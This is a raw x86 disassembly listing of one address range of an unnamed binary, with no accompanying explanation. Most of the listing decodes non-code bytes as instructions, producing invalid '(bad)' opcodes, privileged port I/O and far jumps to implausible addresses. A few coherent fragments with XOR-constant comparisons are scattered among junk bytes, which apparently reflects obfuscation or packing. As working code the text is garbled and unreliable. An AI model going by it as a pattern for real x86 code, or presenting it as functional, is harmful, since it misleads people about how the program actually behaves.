  40b66a:	cwde   
  40b66b:	lea    ebp,[esi-0x2f]
  40b66e:	or     dh,BYTE PTR [ecx-0x16d0a7cc]
  40b674:	xor    esp,0x7
  40b677:	enter  0xfde,0x6e
  40b67b:	neg    DWORD PTR [ecx-0x23]
  40b67e:	(bad)  
  40b67f:	mov    edx,0xad7f49b0
  40b684:	out    dx,eax
  40b685:	inc    edx
  40b686:	pop    eax
  40b687:	jmp    0xf4f4d89d
  40b68c:	dec    esi
  40b68d:	inc    edx
  40b68e:	int    0x8e
  40b690:	shl    BYTE PTR [edx+edx*8],cl
  40b693:	inc    ebx
  40b694:	or     DWORD PTR [edi-0x3f],ebp
  40b697:	in     al,dx
  40b698:	arpl   di,cx
  40b69a:	repz sub edi,DWORD PTR ss:[esi-0x757960c9]
  40b6a2:	sbb    al,0xdf
  40b6a4:	adc    al,0x1e
  40b6a6:	in     al,0x64
  40b6a8:	cmc    
  40b6a9:	adc    esp,DWORD PTR [eax-0x4e18b7b1]
  40b6af:	leave  
  40b6b0:	mov    WORD PTR [esi+0x76447ca8],?
  40b6b6:	dec    ecx
  40b6b7:	(bad)  [ebp-0x45]
  40b6ba:	add    BYTE PTR [edx],bh
  40b6bc:	(bad)  
  40b6bd:	lods   al,BYTE PTR ds:[esi]
  40b6be:	jmp    0xbbe61290
  40b6c3:	add    eax,0x71e950b2
  40b6c8:	inc    ecx
  40b6c9:	les    esi,FWORD PTR cs:[ebx+edi*1+0x7058dabb]
  40b6d1:	clc    
  40b6d2:	cld    
  40b6d3:	out    0xa6,eax
  40b6d5:	sub    bl,BYTE PTR [ebx]
  40b6d7:	ret    
  40b6d8:	ret    0xd9a0
  40b6db:	jmp    0x40b74f
  40b6dd:	push   eax
  40b6de:	das    
  40b6df:	outs   dx,DWORD PTR ds:[esi]
  40b6e0:	icebp  
  40b6e1:	xor    al,BYTE PTR [eax+eax*8-0x2d575fce]
  40b6e8:	jl     0x40b6f0
  40b6ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6eb:	xchg   ebp,eax
  40b6ec:	mov    dh,0x23
  40b6ee:	repz aaa 
  40b6f0:	xor    al,ah
  40b6f2:	mov    dl,0x7e
  40b6f4:	leave  
  40b6f5:	and    esi,edx
  40b6f7:	mov    cl,0x7d
  40b6f9:	lods   al,BYTE PTR ds:[esi]
  40b6fa:	jbe    0x40b743
  40b6fc:	(bad)  
  40b6fd:	stc    
  40b6fe:	(bad)  
  40b6ff:	push   cs
  40b700:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b701:	mov    ds:0x3f85bfc9,eax
  40b706:	adc    eax,0x4e6ba879
  40b70b:	(bad)  
  40b70c:	mov    ah,0x31
  40b70e:	call   0xefdc66f5
  40b713:	test   BYTE PTR [edx],al
  40b715:	sub    BYTE PTR [edx-0xb16c304],0xcd
  40b71c:	call   0x79af9955
  40b721:	mov    ds,WORD PTR [ebx+0x741794a8]
  40b727:	pop    ecx
  40b728:	push   0xffffffa0
  40b72a:	inc    edx
  40b72b:	sbb    esi,DWORD PTR [ecx]
  40b72d:	in     eax,dx
  40b72e:	hlt    
  40b72f:	das    
  40b730:	adc    BYTE PTR [edi+0x3a],dh
  40b733:	test   DWORD PTR [ecx],edx
  40b735:	(bad)  
  40b736:	cmp    eax,0x11822f79
  40b73b:	inc    ecx
  40b73c:	clc    
  40b73d:	shr    BYTE PTR [ecx],1
  40b73f:	stc    
  40b740:	loope  0x40b784
  40b742:	ret    
  40b743:	jp     0x40b6ea
  40b745:	mov    eax,ds:0x679d8485
  40b74a:	pop    esi
  40b74b:	inc    esi
  40b74c:	scas   eax,DWORD PTR es:[edi]
  40b74d:	dec    eax
  40b74e:	push   edi
  40b74f:	adc    BYTE PTR [ebp+0x24c67481],dl
  40b755:	rcl    esp,cl
  40b757:	xchg   edi,eax
  40b758:	mov    bh,bh
  40b75a:	jne    0x40b72c
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	push   edi
  40b78b:	sub    eax,0xfeb29d03
  40b790:	jle    0x40b810
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	mov    esp,0x5f4d7eb0
  40b79b:	push   ss
  40b79c:	ds and cl,0x42
  40b7a0:	mov    dh,0x10
  40b7a2:	sar    DWORD PTR [ebp-0xd],1
  40b7a5:	ds loopne 0x40b744
  40b7a8:	mov    edx,0x11842936
  40b7ad:	cmp    DWORD PTR [esi],esp
  40b7af:	js     0x40b7a5
  40b7b1:	jp     0x40b749
  40b7b3:	lea    ebp,[edi-0x4871cf99]
  40b7b9:	cmp    BYTE PTR [esi],dh
  40b7bb:	mov    ch,0x2f
  40b7bd:	cdq    
  40b7be:	repz add eax,0x2596c23f
  40b7c4:	(bad)  
  40b7c5:	push   esp
  40b7c6:	test   eax,0x74d23707
  40b7cb:	(bad)  
  40b7cc:	jmp    0x40b7ad
  40b7ce:	sub    eax,0x757692b4
  40b7d3:	push   cs
  40b7d4:	push   ebx
  40b7d5:	outs   dx,DWORD PTR ds:[esi]
  40b7d6:	xchg   ecx,eax
  40b7d7:	sbb    eax,DWORD PTR [esi]
  40b7d9:	addr16 mov dh,0xcf
  40b7dc:	lods   al,BYTE PTR ds:[esi]
  40b7dd:	pop    ds
  40b7de:	stc    
  40b7df:	pop    ss
  40b7e0:	fcmove st,st(7)
  40b7e2:	or     DWORD PTR [esi-0x19],eax
  40b7e5:	repnz inc edx
  40b7e7:	or     BYTE PTR [ebp-0x323edfa4],0xf8
  40b7ee:	xor    DWORD PTR [eax-0x3a157c08],ebp
  40b7f4:	enter  0xe64f,0x1d
  40b7f8:	push   ds
  40b7f9:	inc    edi
  40b7fa:	jle    0x40b7ab
  40b7fc:	dec    esi
  40b7fd:	xlat   BYTE PTR cs:[ebx]
  40b7ff:	sbb    BYTE PTR gs:0x5b8b0793,ch
  40b806:	cdq    
  40b807:	pop    ds
  40b808:	aad    0x8b
  40b80a:	dec    edi
  40b80b:	rcl    ah,0x2b
  40b80e:	aas    
  40b80f:	dec    edi
  40b810:	mov    ecx,0xba7d8cb9
  40b815:	cmp    eax,0x7a216fce
  40b81a:	xchg   DWORD PTR [edi],esp
  40b81c:	sub    BYTE PTR [esi],bl
  40b81e:	jno    0x40b7ed
  40b820:	push   eax
  40b821:	pop    ss
  40b822:	pop    edi
  40b823:	ins    DWORD PTR es:[edi],dx
  40b824:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b825:	imul   ebx,DWORD PTR [edx-0x57214e64],0x9bea03d6
  40b82f:	stos   DWORD PTR es:[edi],eax
  40b830:	dec    esp
  40b831:	push   ds
  40b832:	mov    al,ds:0xaa87e966
  40b837:	call   0x63abfda9
  40b83c:	aaa    
  40b83d:	jle    0x40b82a
  40b83f:	sti    
  40b840:	in     al,0xc
  40b842:	test   eax,0xc6c3389c
  40b847:	mov    esp,0x9582e4d8
  40b84c:	inc    esp
  40b84d:	sbb    eax,0x359aa161
  40b852:	jbe    0x40b88f
  40b854:	fwait
  40b855:	mov    edi,0x21b984a2
  40b85a:	xchg   esi,eax
  40b85b:	iret   
  40b85c:	in     al,0x25
  40b85e:	or     eax,0x4095b825
  40b863:	pushf  
  40b864:	xor    eax,0x70c2b2b4
  40b869:	sti    
  40b86a:	or     al,0x52
  40b86c:	and    eax,0x2d73ff30
  40b871:	sub    al,0x44
  40b873:	push   0xa
  40b875:	(bad)  
  40b876:	push   edx
  40b877:	ss int 0xe0
  40b87a:	xchg   edx,eax
  40b87c:	mov    bl,0x45
  40b87e:	sub    al,0xbe
  40b880:	cdq    
  40b881:	stos   DWORD PTR es:[edi],eax
  40b882:	popa   
  40b883:	int    0x54
  40b885:	or     al,0xac
  40b887:	fs xor ch,bl
  40b88a:	repnz inc edi
  40b88c:	out    0xfb,eax
  40b88e:	jecxz  0x40b832
  40b890:	xchg   BYTE PTR [ecx-0x41],cl
  40b893:	cwde   
  40b894:	call   0xa804:0x64b74fb1
  40b89b:	je     0x40b879
  40b89d:	mov    bh,BYTE PTR [edx+ebx*1+0x3]
  40b8a1:	jmp    0xfededdaf
  40b8a6:	mov    dh,0xfb
  40b8a8:	jbe    0x40b8a9
  40b8aa:	in     eax,0xe1
  40b8ac:	rol    DWORD PTR [esi-0x3b],1
  40b8af:	pop    esp
  40b8b0:	(bad)  
  40b8b1:	sti    
  40b8b2:	mov    eax,ds:0x8c1c14ea
  40b8b7:	pop    edi
  40b8b8:	fsubr  DWORD PTR [esi+ebx*8+0x68]
  40b8bc:	push   edi
  40b8bd:	iret   
  40b8be:	shl    DWORD PTR [edi-0x5e],cl
  40b8c1:	loopne 0x40b92c
  40b8c3:	push   0xcf971b58
  40b8c8:	idiv   DWORD PTR [ebx]
  40b8ca:	test   DWORD PTR [ecx-0x49de4436],esi
  40b8d0:	bound  ebx,QWORD PTR [edx-0x7e]
  40b8d3:	cmp    al,0xbe
  40b8d5:	sub    DWORD PTR ds:0x61c77ea7,0x35
  40b8dc:	xchg   sp,ax
  40b8de:	sub    esp,DWORD PTR [ebx]
  40b8e0:	dec    edi
  40b8e1:	and    DWORD PTR [ebx+0x6867a83f],ebx
  40b8e7:	rcr    al,0x6c
  40b8ea:	pusha  
  40b8eb:	xchg   BYTE PTR ss:[ecx],ah
  40b8ee:	fcom   QWORD PTR [eax+0x1db6c2f7]
  40b8f4:	jae    0x40b8ee
  40b8f6:	shl    DWORD PTR [esi],0x9
  40b8f9:	xchg   ecx,eax
  40b8fa:	jns    0x40b912
  40b8fc:	jnp    0x40b8d3
  40b8fe:	jns    0x40b960
  40b900:	push   ebp
  40b901:	sub    al,0xcb
  40b903:	pop    eax
  40b904:	sbb    al,0xf2
  40b906:	in     eax,0x60
  40b908:	adc    eax,0x1d13da90
  40b90d:	test   DWORD PTR [esi],edi
  40b90f:	cwde   
  40b910:	mov    ebx,0x4503fe6e
  40b915:	arpl   ax,cx
  40b917:	out    dx,eax
  40b918:	fnstenv [edx+0x586e8a91]
  40b91e:	inc    edi
  40b91f:	sub    BYTE PTR ds:0x6910a845,cl
  40b925:	sub    al,0xcc
  40b927:	pop    esp
  40b928:	cmp    eax,0xd8a85703
  40b92d:	popa   
  40b92e:	xchg   DWORD PTR [ebp+0x68],esi
  40b931:	dec    ebp
  40b932:	sub    al,0x87
  40b934:	fiadd  WORD PTR [ebp-0x993134d]
  40b93a:	out    0x40,al
  40b93c:	cld    
  40b93d:	shr    dh,1
  40b93f:	shl    edx,cl
  40b941:	jg     0x40b95d
  40b943:	add    edi,ecx
  40b945:	cmp    edx,DWORD PTR [ebx+ecx*8-0x3]
  40b949:	jg     0x40b967
  40b94b:	push   ds
  40b94c:	push   ecx
  40b94d:	call   0x2ef06caa
  40b952:	jecxz  0x40b957
  40b954:	cmp    eax,0x3bd1754b
  40b959:	ficomp WORD PTR [ecx+edi*2]
  40b95c:	or     BYTE PTR [edi+edi*8+0x7f],bh
  40b960:	leave  
  40b961:	inc    ecx
  40b962:	jp     0x40b8f0
  40b964:	inc    esp
  40b965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b966:	out    0x14,al
  40b968:	in     eax,dx
  40b969:	or     ch,BYTE PTR [ebx+0xe]
  40b96c:	xor    ebx,DWORD PTR ds:[edx+edi*1-0x44bd60b9]
  40b974:	in     al,0x4c
  40b976:	or     DWORD PTR [eax+0x159d49ce],0x3dbef4e8
  40b980:	into   
  40b981:	and    dl,BYTE PTR [ebx+0x15]
  40b984:	sar    DWORD PTR [ebp-0x66db3ee8],1
  40b98a:	dec    ecx
  40b98b:	fild   DWORD PTR [esi+esi*4]
  40b98e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b98f:	pop    edi
  40b990:	dec    ecx
  40b991:	(bad)  
  40b992:	mov    ah,0xfd
  40b994:	and    BYTE PTR [ebx+0xa],ah
  40b997:	jb     0x40b93a
  40b999:	xor    bl,cl
  40b99b:	or     esi,DWORD PTR [edx]
  40b99d:	shl    edi,0x4c
  40b9a0:	adc    BYTE PTR [eiz*1+0x5df997f6],dh
  40b9a7:	dec    ebx
  40b9a8:	test   esp,ecx
  40b9aa:	dec    ebx
  40b9ab:	push   ds
  40b9ac:	cmp    al,0x23
  40b9ae:	lods   eax,DWORD PTR ds:[esi]
  40b9af:	imul   esi,DWORD PTR [ecx-0x57],0xdc9ba19e
  40b9b6:	iret   
  40b9b7:	or     eax,0x4503546a
  40b9bc:	jp     0x40ba28
  40b9be:	dec    esp
  40b9bf:	mov    WORD PTR ds:0xca20cd85,cs
  40b9c5:	mov    eax,0xfd149690
  40b9ca:	push   edx
  40b9cb:	xchg   edx,eax
  40b9cc:	je     0x40ba19
  40b9ce:	mov    ecx,0x2b7d914f
  40b9d3:	sahf   
  40b9d4:	out    0x7a,eax
  40b9d6:	scas   eax,DWORD PTR es:[edi]
  40b9d7:	jbe    0x40b9b2
  40b9d9:	test   ebx,0xe0458b63
  40b9df:	inc    edi
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8-0x45cc57f8],eax
  40ba0f:	jo     0x40ba45
  40ba11:	jl     0x40ba10
  40ba13:	jle    0x40ba93
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	std    
  40ba1a:	mov    bl,0xff
  40ba1c:	jno    0x40ba01
  40ba1e:	pop    ebp
  40ba1f:	not    ch
  40ba21:	cmp    al,0xde
  40ba23:	adc    cl,ch
  40ba25:	ja     0x40ba9f
  40ba27:	inc    edi
  40ba28:	push   ebx
  40ba29:	leave  
  40ba2a:	and    cl,BYTE PTR [esi+edi*8-0x21665671]
  40ba31:	mov    bh,dh
  40ba33:	int3   
  40ba34:	in     eax,0xe6
  40ba36:	jnp    0x40ba14
  40ba38:	call   0xe969:0xab925153
  40ba3f:	and    edx,0xcc55d67
  40ba45:	adc    BYTE PTR [ebx],0x3d
  40ba48:	popa   
  40ba49:	dec    esp
  40ba4a:	push   esi
  40ba4b:	mov    esi,0x77362b40
  40ba50:	mov    eax,ds:0x632e72e3
  40ba55:	push   ds
  40ba56:	jmp    0x40ba47
  40ba58:	pop    es
  40ba59:	das    
  40ba5a:	das    
  40ba5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba5c:	mov    ch,0x68
  40ba5e:	popf   
  40ba5f:	mov    ch,0x9
  40ba61:	aam    0xe1
  40ba63:	in     eax,0x76
  40ba65:	cmp    BYTE PTR ds:0x65c1461c,0x32
  40ba6c:	sub    al,0x52
  40ba6e:	es inc ebx
  40ba70:	ss xchg esp,eax
  40ba72:	mov    bp,0x9b05
  40ba76:	js     0x40ba7e
  40ba78:	jns    0x40ba45
  40ba7a:	inc    ebx
  40ba7b:	lods   eax,DWORD PTR ds:[esi]
  40ba7c:	or     cl,ch
  40ba7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba7f:	cmp    bl,BYTE PTR [ebx]
  40ba81:	js     0x40ba27
  40ba83:	imul   esi,DWORD PTR [eax+0x2d693fc9],0x69f7251f
  40ba8d:	mov    al,0x2a
  40ba8f:	stc    
  40ba90:	or     DWORD PTR ss:[ebp-0x45afdffc],esp
  40ba97:	sahf   
  40ba98:	push   ds
  40ba99:	fisubr DWORD PTR [edi]
  40ba9b:	je     0x40ba48
  40ba9d:	xor    edx,DWORD PTR fs:[ebx]
  40baa0:	cmp    DWORD PTR [ecx],ecx
  40baa2:	pop    ebp
  40baa3:	jle    0x40badf
  40baa5:	adc    edi,edi
  40baa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40baa8:	lahf   
  40baa9:	imul   eax,DWORD PTR [ebx-0x4f3ba679],0x1d
  40bab0:	rcr    DWORD PTR [ebp+0x2f947019],cl
  40bab6:	add    DWORD PTR [ecx],0x56
  40bab9:	repnz pop ecx
  40babb:	mov    edi,0xe8669424
  40bac0:	mov    ah,0x71
  40bac2:	pop    ecx
  40bac3:	ins    DWORD PTR es:[edi],dx
  40bac4:	dec    esi
  40bac5:	or     al,0xf8
  40bac7:	jae    0x40ba9f
  40bac9:	add    BYTE PTR [edi+eiz*2+0x1be222fc],dl
  40bad0:	outs   dx,DWORD PTR ds:[esi]
  40bad1:	mov    al,ds:0xc0400a1e
  40bad6:	sbb    ch,dl
  40bad8:	outs   dx,BYTE PTR ds:[esi]
  40bad9:	pop    ecx
  40bada:	pop    eax
  40badb:	mov    ebp,0xbfe23610
  40bae0:	and    bl,BYTE PTR [esi]
  40bae2:	and    DWORD PTR [ebx+ebx*4],ebp
  40bae5:	jae    0x40bb44
  40bae7:	arpl   WORD PTR [edx+edi*2],cx
  40baea:	in     al,0xb2
  40baec:	sub    BYTE PTR [ebx-0x7c],cl
  40baef:	sub    ebp,ebx
  40baf1:	xor    bl,BYTE PTR [ebx+0x73d1390c]
  40baf7:	jge    0x40bb15
  40baf9:	std    
  40bafa:	leave  
  40bafb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bafc:	fsubr  st,st(2)
  40bafe:	loop   0x40baeb
  40bb00:	stos   BYTE PTR es:[edi],al
  40bb01:	push   edi
  40bb02:	imul   ebx,esp,0xef66a6a9
  40bb08:	stc    
  40bb09:	leave  
  40bb0a:	fist   DWORD PTR [edx-0xf9935b5]
  40bb10:	outs   dx,DWORD PTR ds:[esi]
  40bb11:	cdq    
  40bb12:	add    dh,dh
  40bb14:	mov    bl,0x87
  40bb16:	mov    ebx,0x85c67061
  40bb1b:	rcr    BYTE PTR [edi-0x70f33bf8],cl
  40bb21:	jmp    0xf3cc:0x3305ce5a
  40bb28:	and    DWORD PTR [esi+eax*8+0x5b],esp
  40bb2c:	jle    0x40bb2a
  40bb2e:	dec    edi
  40bb2f:	inc    edx
  40bb30:	es pushf 
  40bb32:	outs   dx,BYTE PTR ds:[esi]
  40bb33:	into   
  40bb34:	sbb    bl,BYTE PTR [ebx]
  40bb36:	cmp    al,0x46
  40bb38:	imul   esi,DWORD PTR [esi-0x64d1ee3c],0x78
  40bb3f:	lods   eax,DWORD PTR ds:[esi]
  40bb40:	mov    eax,0xafdd5931
  40bb45:	call   0x8898:0xaba81591
  40bb4c:	xor    DWORD PTR [ebx],esp
  40bb4e:	into   
  40bb4f:	stos   DWORD PTR es:[edi],eax
  40bb50:	pop    ebp
  40bb51:	pop    es
  40bb52:	jp     0x40bbc9
  40bb54:	ret    0x3be4
  40bb57:	mul    DWORD PTR [esi+0x52]
  40bb5a:	(bad)  
  40bb5b:	and    bl,BYTE PTR [edx+eiz*4+0x3bfe8623]
  40bb62:	push   ebx
  40bb63:	test   al,0x38
  40bb65:	sub    al,0x18
  40bb67:	mov    cs,ebx
  40bb69:	daa    
  40bb6a:	or     edx,esi
  40bb6c:	push   edx
  40bb6d:	aas    
  40bb6e:	adc    dh,bl
  40bb70:	fdiv   QWORD PTR [ebp+0x4bde5c01]
  40bb76:	cdq    
  40bb77:	dec    edx
  40bb78:	mov    dl,0x8c
  40bb7a:	and    BYTE PTR [esi+ebx*8-0x1d23830],0x38
  40bb82:	out    0x3,al
  40bb84:	imul   DWORD PTR [edx]
  40bb86:	test   DWORD PTR [edx+eiz*2],0x8bd455b7
  40bb8d:	icebp  
  40bb8e:	adc    cl,BYTE PTR [ecx]
  40bb90:	sub    ah,BYTE PTR [edx-0x33]
  40bb93:	fnstcw WORD PTR [eax-0x432382ed]
  40bb99:	fistp  WORD PTR [ecx+0x7ffe22ed]
  40bb9f:	pop    ebp
  40bba0:	clc    
  40bba1:	div    al
  40bba3:	mov    ds:0xf2b1090a,eax
  40bba8:	jne    0x40bb6a
  40bbaa:	push   0xdb0114df
  40bbaf:	push   es
  40bbb0:	mov    ds:0x712ed4e1,al
  40bbb5:	fwait
  40bbb6:	jno    0x40bb3c
  40bbb8:	sbb    bl,BYTE PTR ds:0x758cbe0b
  40bbbe:	out    dx,al
  40bbbf:	push   ecx
  40bbc0:	or     BYTE PTR [edi],bl
  40bbc2:	and    al,0xbb
  40bbc4:	sbb    BYTE PTR [ebx],0x25
  40bbc7:	jmp    0x99bb56ac
  40bbcc:	nop
  40bbcd:	push   esp
  40bbce:	jbe    0x40bc0d
  40bbd0:	sub    BYTE PTR [esi+0x18],bh
  40bbd3:	sbb    eax,0xe42d6301
  40bbd8:	fld    QWORD PTR [edx+0x38]
  40bbdb:	in     eax,0x2f
  40bbdd:	jb     0x40bb68
  40bbdf:	cdq    
  40bbe0:	mov    ds,WORD PTR [edx]
  40bbe2:	jle    0x40bb9c
  40bbe4:	sub    DWORD PTR [edi-0x54143ada],ebx
  40bbea:	xchg   esi,eax
  40bbeb:	in     al,0x23
  40bbed:	int    0x47
  40bbef:	jno    0x40bbdf
  40bbf1:	mov    ds,WORD PTR [esi+0x64e32f58]
  40bbf7:	test   esi,edx
  40bbf9:	pop    edi
  40bbfa:	loope  0x40bc6b
  40bbfc:	(bad)  
  40bbfd:	xor    ecx,ebx
  40bbff:	clc    
  40bc00:	xor    al,BYTE PTR [eax-0x80]
  40bc03:	pop    esi
  40bc04:	mov    edi,0xca400950
  40bc09:	popf   
  40bc0a:	sar    edx,cl
  40bc0c:	xor    edi,eax
  40bc0e:	mov    ebp,0x6b2be15d
  40bc13:	adc    al,0xcb
  40bc15:	daa    
  40bc16:	dec    esi
  40bc17:	out    0x96,al
  40bc19:	xchg   ecx,eax
  40bc1a:	adc    eax,0x365f2063
  40bc1f:	adc    al,0x86
  40bc21:	(bad)  
  40bc22:	in     al,dx
  40bc23:	fbstp  TBYTE PTR [ebx+0x55fbff5]
  40bc29:	lahf   
  40bc2a:	dec    edi
  40bc2b:	stc    
  40bc2c:	mov    esi,DWORD PTR [edx+0x467e0ef8]
  40bc32:	call   0xaba:0x514ed7ed
  40bc39:	pop    esi
  40bc3a:	lahf   
  40bc3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc3c:	test   al,0xdc
  40bc3e:	inc    ecx
  40bc3f:	cli    
  40bc40:	sahf   
  40bc41:	daa    
  40bc42:	jo     0x40bc39
  40bc44:	not    DWORD PTR [ecx+0x3b]
  40bc47:	mov    WORD PTR [ebx],ss
  40bc49:	fidivr DWORD PTR [ebx+0xbcc490d]
  40bc4f:	sub    al,0x3d
  40bc51:	lods   eax,DWORD PTR ds:[esi]
  40bc52:	in     eax,0xe
  40bc54:	pop    ebx
  40bc55:	dec    edi
  40bc56:	push   0xadee14bf
  40bc5b:	xchg   esp,eax
  40bc5c:	push   es
  40bc5d:	jle    0x40bc11
  40bc5f:	movzx  eax,WORD PTR [eax+edi*2]
  40bc63:	mov    ecx,DWORD PTR [ebp-0x14]
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	popa   
  40bc96:	je     0x40bd0f
  40bc98:	jo     0x40bc60
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	jns    0x40bcef
  40bca3:	push   0xba3fe654
  40bca8:	je     0x40bd20
  40bcaa:	push   0xffffff8d
  40bcac:	push   0x96d8528f
  40bcb1:	mov    bl,0x77
  40bcb3:	bound  edx,QWORD PTR [edx-0x520fb67]
  40bcb9:	inc    edi
  40bcba:	bound  esp,QWORD PTR [edx]
  40bcbc:	js     0x40bd19
  40bcbe:	sahf   
  40bcbf:	ret    
  40bcc0:	add    cl,BYTE PTR [edi-0x59]
  40bcc3:	cmp    al,0xec
  40bcc5:	xor    eax,0xb26aa51f
  40bcca:	aad    0xc
  40bccc:	adc    DWORD PTR [esi+0x53ff0740],edx
  40bcd2:	scas   al,BYTE PTR es:[edi]
  40bcd3:	dec    ebx
  40bcd4:	stos   BYTE PTR es:[edi],al
  40bcd5:	sbb    al,0x37
  40bcd7:	imul   ecx,DWORD PTR [esi-0xbeda0fa],0xd7769f73
  40bce1:	lahf   
  40bce2:	sub    ebx,DWORD PTR [eax+0x6088bf14]
  40bce8:	push   0xb923cdd6
  40bced:	rol    DWORD PTR [ebx],cl
  40bcef:	cmp    dl,dl
  40bcf1:	xchg   ch,dh
  40bcf3:	mov    ah,0xc
  40bcf5:	in     eax,0xb5
  40bcf7:	xchg   edx,eax
  40bcf8:	test   BYTE PTR [ebx-0x48],ch
  40bcfb:	cmp    DWORD PTR [edx-0x6a],0xffffffa5
  40bcff:	push   ebx
  40bd00:	neg    DWORD PTR [eax]
  40bd02:	dec    ebx
  40bd03:	jno    0x40bcc4
  40bd05:	jge    0x40bcf7
  40bd07:	adc    dl,BYTE PTR [eax-0x16]
  40bd0a:	mov    cl,0x4d
  40bd0c:	add    eax,0x9c857726
  40bd11:	call   0x6d2d:0x99c63c20
  40bd18:	dec    edi
  40bd19:	adc    ch,BYTE PTR [edi+eiz*1]
  40bd1c:	mov    ecx,0x867c8363
  40bd21:	xchg   ecx,eax
  40bd22:	and    DWORD PTR [ecx+0x1224c2a1],esp
  40bd28:	shl    BYTE PTR [eax],cl
  40bd2a:	repnz push ss
  40bd2c:	mov    eax,0x2c5e9b9d
  40bd31:	and    eax,0xfb1f3466
  40bd36:	mov    bh,0x54
  40bd38:	out    0x8d,eax
  40bd3a:	retf   
  40bd3b:	or     edx,DWORD PTR [ebx-0x12933067]
  40bd41:	not    cl
  40bd43:	js     0x40bd6e
  40bd45:	mov    dh,BYTE PTR [esi+0xfcbe45e]
  40bd4b:	cwde   
  40bd4c:	jae    0x40bd9d
  40bd4e:	js     0x40bd4e
  40bd50:	arpl   WORD PTR [ecx],bx
  40bd52:	push   es
  40bd53:	mov    ah,0x43
  40bd55:	jg     0x40bda9
  40bd57:	stc    
  40bd58:	fisttp WORD PTR [edi]
  40bd5a:	imul   eax,DWORD PTR ds:0xd4549b21,0xffffffb4
  40bd61:	ja     0x40bd24
  40bd63:	shl    BYTE PTR [edx+edi*2-0x7efb27b],cl
  40bd6a:	add    al,0xda
  40bd6c:	inc    ebx
  40bd6d:	add    al,ch
  40bd6f:	lods   al,BYTE PTR ds:[esi]
  40bd70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd71:	xchg   edi,eax
  40bd72:	pop    ss
  40bd73:	int3   
  40bd74:	fwait
  40bd75:	mov    al,0x35
  40bd77:	ja     0x40bd0d
  40bd79:	jmp    0x40bda4
  40bd7b:	leave  
  40bd7c:	iret   
  40bd7d:	push   ds
  40bd7e:	jno    0x40bda8
  40bd80:	xor    dh,cl
  40bd82:	cmp    esi,DWORD PTR [ebx-0x5c]
  40bd85:	and    BYTE PTR [esi-0x3d8410bf],dl
  40bd8b:	popa   
  40bd8c:	idiv   DWORD PTR [edx+0x3c0b68d0]
  40bd92:	fdiv   QWORD PTR [eax]
  40bd94:	and    BYTE PTR [ecx],0x68
  40bd97:	sub    eax,0xc0790aa6
  40bd9c:	mov    edi,0x907e9392
  40bda1:	call   0x4390997f
  40bda6:	sbb    eax,0xb63fac76
  40bdab:	cs call 0x173d1182
  40bdb1:	(bad)  
  40bdb2:	test   al,0x67
  40bdb4:	clc    
  40bdb5:	sahf   
  40bdb6:	jp     0x40be27
  40bdb8:	add    edx,esi
  40bdba:	cmp    DWORD PTR [ecx],eax
  40bdbc:	xor    cl,BYTE PTR [ebp+0x1b]
  40bdbf:	sub    bh,0x19
  40bdc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdc3:	pushf  
  40bdc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdc5:	mov    esp,0xcedaeffa
  40bdca:	xor    DWORD PTR [ebx-0x6b320c49],ebp
  40bdd0:	jg     0x40bda8
  40bdd2:	or     cl,BYTE PTR [edx+0x23c5aaf5]
  40bdd8:	std    
  40bdd9:	imul   ecx,DWORD PTR [ebx+0x523ae3fc],0xffffffd7
  40bde0:	xchg   DWORD PTR [ebx+0x315b0de6],eax
  40bde6:	adc    esi,DWORD PTR [edi]
  40bde8:	retf   
  40bde9:	jns    0x40bd8f
  40bdeb:	out    dx,eax
  40bdec:	and    eax,0x56b592e2
  40bdf1:	nop
  40bdf2:	sub    edi,DWORD PTR [ebp+0x6ddb429d]
  40bdf8:	mov    ebp,0x85422654
